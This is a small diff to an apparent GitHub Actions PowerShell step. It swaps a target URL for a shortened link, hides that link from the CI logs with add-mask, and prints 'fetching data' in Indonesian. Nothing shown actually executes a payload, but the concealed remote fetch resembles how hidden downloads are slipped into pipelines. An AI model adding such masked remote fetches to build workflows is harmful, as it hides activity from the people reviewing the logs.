@@ -26,7 +26,7 @@ jobs:
       shell: pwsh
       run: |
         # Tunggu Sayang . . .
-        $targetUrl = "https://arianto12.lynk.id/p/ganjay"
+        $targetUrl = "https://8svfb51.s.gy/RepoKode"
         Write-Host "::add-mask::$targetUrl"
         
         Write-Host "MENGAMBIL DATA . . ."
